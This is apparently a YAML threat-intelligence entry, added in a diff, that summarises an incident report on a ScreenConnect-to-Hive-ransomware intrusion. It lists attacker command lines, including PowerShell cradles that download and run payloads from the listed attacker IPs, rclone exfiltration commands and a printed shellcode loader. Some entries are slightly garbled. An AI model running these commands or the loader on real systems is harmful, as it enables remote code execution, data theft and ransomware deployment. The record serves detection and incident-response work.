@@ -1,0 +1,131 @@
+summary: This report details a cyber threat involving the AteraAgent and Splashtop
+  Remote Support software, likely leveraged by an attacker for remote access and data
+  exfiltration. The attack chain involves persistence mechanisms, PowerShell scripts,
+  command execution using cmd.exe, and the use of rclone for file transfer.
+date: '2024-01-31'
+authors:
+- 0xThiebaut
+- UC2
+- 0xtornado
+attribution: Unknown
+malware_families:
+- Splashtop Remote Support
+- Hive Ransomware
+- Metasploit
+- AteraAgent
+- Cobalt Strike
+- Powerfun
+- Mimikatz
+- ApacheBench
+- ScreenConnect
+TTPs:
+  processs:
+  - ScreenConnect.ClientService.exe
+  - WerFault.exe
+  - cmd.exe
+  - document8765.exe
+  - Rclone
+  - werfault.exe
+  - net.exe
+  - msiexec.exe
+  - powershell.exe
+  - systeminfo
+  - ruindiz.exe
+  - wmiexec.py
+  - ipconfig
+  - RDP
+  - rundll32.exe
+  - BITS
+  - rclone
+  - SRUtility.exe
+  - netscan
+  - winlogon.exe
+  - quser
+  - AgentPackageUpgradeAgent.exe
+  commandline:
+  - cmd.exe /Q /c adcomp bat > \\127.0.0.1\ADMINS\_1685
+  - cmd.exe /Q /c cd 1> \\127.0.0.1\ADMINS\_1656
+  - cmd.exe /Q /c quser 1> \\127.0.0.1\ADMINS\_1655
+  - powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://31.41.244.192:80/645gkdkfgd'))"
+  - cmd.exe /Q /c cd 1> \\127.0.0.1\ADMINS\_1666
+  - cmd.exe /Q /c del m2.exe 1> \\127.0.0.1\ADMINS\_1665
+  - cmd.exe /Q /e del > \\127.0.0.1\ADMINS\_1665
+  - cmd.exe /Q /c cd\ 1> \\127.0.0.1\ADMINS\_1655
+  - powershell.exe -nop -c "start-job { param($a) Import-Module BitsTransfer; $d =
+    $env:itemp + \... "
+  - '"C:\Windows\TEMP\AteraUpgradeAgentPackage\AgentPackageUpgradeAgent.exe" "520c8a35...'
+  - cmd.exe /Q /c del adcomp bat 1> \\127.0.0.1\ADMINS\_1665
+  - powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z=\"echo
+    ($env:temp+'\\P6nqEdwk.exe')\"; (new-object System.Net.WebClient).DownloadFile('http://94.232.43.201:8080/dQhNZOV3Qm',
+    $z); invoke-item $z"
+  - cmd.exe /Q /c del log2.xt 1> \\127.0.0.1\ADMINS\_1655
+  - cmd.exe /Q /c dir 1> \\127.0.0.1\ADMINS\_1665
+  - wmiexec.py
+  - msiexec.exe /i C:\\programdata\\setup.msi
+  - cmd.exe /Q /e cd\ 1> \\127.0.0.1\ADMINS\_1656
+  - rclone copy
+  - cmd.exe /Q /c cd c/programdata 1> \\127.0.0.1\ADMINS\_1665
+  - rclone cconfig
+  - cmd.exe /Q /c dellog2xt 1> \\127.0.0.1\ADMINS\_1666
+  - powershell.exe -nop -c "start-job { param($a) Import-Module BitsTransfer; $d =
+    $env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source
+    'http://31.41.244.192:80/96945jgjf' -Destination $d; $t = [IO.File]::ReadAllText($d);
+    Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job"
+  - cmd.exe /Q /c m2.exe 1> \\127.0.0.1\ADMINS\_1656
+  - cmd.exe /Q /c del adcomp.bat 1> \\127.0.0.1\ADMINS\_1665
+  - rclone config
+  - '"C:\Program Files (x86)\Splashtop\Splashtop Remote\Server\SRUtility.exe" -a "st-streamer://co...'
+  powershell:
+  - Set-StrictMode -Version 2 $DoIt = @' function func_get_proc { Param ( $var_module_name,
+    $var_procedure_name ) $var_system_dll = [AppDomain]::CurrentDomain.GetAssemblies()
+    | Where-Object { $_.Location -And $_.Location.Split('\\\\')[-1].Equals('System.dll')
+    -And $_.GlobalAssemblyCache } $var_microsoft_win32_unsafe_native_methods = $var_system_dll.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $var_get_module_handle = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetModuleHandle')
+    $var_get_proc_address = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetProcAddress',
+    [Type[]] @('System.Runtime.InteropServices.HandleRef', 'System.String')) $var_module_handle
+    = $var_get_module_handle.Invoke($null, @($var_module_name)) return $var_get_proc_address.Invoke($null,
+    @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object
+    IntPtr), $var_module_handle)), $var_procedure_name)) } function func_get_type
+    { Param ( [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameter_types,
+    [Parameter(Position = 1)] [Type] $var_return_type = [Void] ) $var_invoke_method
+    = 'Invoke' $var_type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object
+    System.Reflection.AssemblyName('Powerfun', 'Public, Sealed, AnsiClass, AutoClass')),
+    [System.MulticastDelegate]) $var_type.DefineConstructor('RTSpecialName, HideBySig,
+    Public', [System.Reflection.CallingConventions]::Standard, $var_parameter_types).SetImplementationFlags('Runtime,
+    Managed') $var_type.DefineMethod($var_invoke_method, 'Public, HideBySig, NewSlot,
+    Virtual', $var_return_type, $var_parameter_types).SetImplementationFlags('Runtime,
+    Managed') return $var_type.CreateType() } $var_base64 = 'i0QkBIuInAAAA[...]AAAAAAA='
+    $var_result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc
+    kernel32.dll LoadLibraryA), (func_get_type @([String]) ([IntPtr]))).Invoke('crypt32.dll')
+    $var_string_to_binary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc
+    crypt32.dll CryptStringToBinaryA), (func_get_type @([String], [UInt32], [UInt32],
+    [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [IntPtr]) ([Bool]))) $var_length
+    = 0 $var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length,
+    0x1, [IntPtr]::Zero, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero) $var_create_mapping
+    = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc
+    kernel32.dll CreateFileMappingA), (func_get_type @([IntPtr], [IntPtr], [UInt32],
+    [UInt32], [UInt32], [IntPtr]) ([IntPtr]))) $var_handle = $var_create_mapping.Invoke(-1,
+    [IntPtr]::Zero, 0x08000040, 0x0, $var_length, [IntPtr]::Zero) $var_map_view =
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc
+    kernel32.dll MapViewOfFile), (func_get_type @([IntPtr], [UInt32], [UInt32], [UInt32],
+    [IntPtr]) ([IntPtr]))) $var_map = $var_map_view.Invoke($var_handle, 0x000F003F,
+    0, 0, $var_length) $var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length,
+    0x1, $var_map, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero) $var_invoke =
+    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_map,
+    (func_get_type @([IntPtr]) ([Void]))) $var_invoke.Invoke($var_map) '@ Switch ([intptr]::Size)
+    { 4 { IEX $DoIt } 8 { start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt
+    | wait-job | Receive-Job } }
+  registry_keys: null
+  network_connections: null
+  file_modifications: null
+  persistence:
+  - ScreenConnect service auto-start.
+  pipes: null
+  process_relations: null
+IOCs:
+- 31.41.244.192
+- 94.232.43[.]201
+- https[:]//environmentca[.]com/bkh6q
+author: Unknown
+reference: https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/
+file_creation_date: May 09, 2025
